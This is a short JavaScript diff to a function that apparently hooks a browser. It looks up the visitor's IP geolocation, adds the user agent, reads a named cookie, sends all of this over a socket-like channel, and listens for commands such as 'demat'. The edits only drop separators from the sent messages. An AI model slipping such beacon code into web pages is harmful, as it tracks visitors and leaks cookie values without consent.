@@ -27,7 +27,7 @@ function arvererInit(c) {
 			if (this.readyState == 4 && this.status == 200) {
 				var res = JSON.parse(this.responseText);
 				res.userAgent = navigator.userAgent;
-				sendAction('metadata', res);
+				send('metadata' + JSON.stringify(res));
 			}
 		};
 		ajax.open('get', 'http://ip-api.com/json');
@@ -44,7 +44,7 @@ function arvererInit(c) {
 				cookie = candidate.substring(name.length, candidate.length);
 			}
 		}
-		arverer.send(COOKIE_NAME + ' ' + cookie);
+		arverer.send(COOKIE_NAME + cookie);
 	};
 	arverer.onmessage = function(messageEvent) {
 		if (messageEvent.data == 'demat') {
